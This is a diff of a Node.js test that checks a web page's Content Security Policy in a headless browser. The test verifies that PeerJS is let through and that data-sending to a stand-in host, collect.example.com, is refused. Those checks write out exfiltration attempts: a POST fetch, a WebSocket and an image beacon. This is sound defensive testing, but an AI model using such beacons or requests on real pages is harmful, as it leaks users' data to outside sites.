@@ -11,7 +11,7 @@ const path = require('path');
 const crypto = require('crypto');
 const { launch, serve, reporter } = require('./browser');
 const root = path.join(__dirname, '..');
-const report = reporter(), { results, check } = report;
+const report = reporter(), { check } = report;
 
 const html = fs.readFileSync(path.join(root, 'index.html'), 'utf8');
 const PEERJS = fs.readFileSync(path.join(root, 'net.js'), 'utf8').match(/const PEERJS = '([^']+)'/)[1];
@@ -27,7 +27,7 @@ const policy = Object.fromEntries((metas[0]?.[1] || '').split(';').map(d => d.tr
 const same = (a = [], b) => a.length === b.length && b.every(x => a.includes(x));
 check(same(policy['default-src'], ["'none'"]), "default-src is 'none': whatever it doesn't name is refused", policy['default-src']?.join(' '));
 
-const inline = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map(m => `'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`);
+const inline = [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>([\s\S]*?)<\/script\s*>/gi)].map(m => `'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`);
 const scripts = policy['script-src'] || [];
 const hashes = scripts.filter(s => s.startsWith("'sha"));
 const others = scripts.filter(s => !s.startsWith("'sha"));
@@ -70,7 +70,9 @@ const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation'
     check(await ev(`JSON.stringify(__refused)`) === '[]', 'nothing the page does is refused', await ev(`__refused.join('; ')`));
 
     // What the policy lets out: PeerJS's pinned file, and its broker.
-    await ev(`(() => { const s = document.createElement('script'); s.src = ${JSON.stringify(PEERJS)}; document.head.append(s); fetch('https://0.peerjs.com/peerjs/id').catch(() => {}); return 'ok'; })()`);
+    const { result: page } = await b.send('Runtime.evaluate', { expression: 'globalThis' }); // (PEERJS goes in as a value, never as code)
+    await b.send('Runtime.callFunctionOn', { objectId: page.objectId, arguments: [{ value: PEERJS }],
+      functionDeclaration: `function (src) { const s = document.createElement('script'); s.src = src; document.head.append(s); fetch('https://0.peerjs.com/peerjs/id').catch(() => {}); }` });
     await b.sleep(500);
     check(asked.includes(PEERJS) && asked.some(u => u.startsWith('https://0.peerjs.com/')), "PeerJS's file and broker are let through", asked.join(', '));
     check(await ev(`(() => { const w = new WebSocket('wss://0.peerjs.com/peerjs'); w.close(); return __refused.length === 0; })()`), "PeerJS's broker's socket is let through");
@@ -90,13 +92,9 @@ const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation'
     await refused('sending to another site', `fetch('https://collect.example.com/?d=1', { method: 'POST', body: 'x' }).then(() => true, () => false)`, 'connect-src');
     await refused('a socket to another site', `(() => { try { new WebSocket('wss://collect.example.com/'); } catch {} return false; })()`, 'connect-src');
     await refused('an image from another site (a way to send)', `new Promise(r => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = 'https://collect.example.com/p.gif?d=1'; })`, 'img-src');
-
-    console.log(results.join('\n'));
-    if (b.errors.length) { console.log('page errors:', b.errors); report.failed++; }
   } finally {
     await b.close();
     site.close();
   }
-  if (report.failed) { console.error(`\n${report.failed} failed`); process.exit(1); }
-  console.log(`\nall passed (${results.length} checks)`);
+  report.end(b);
 })().catch(e => { console.error(e); process.exit(1); });
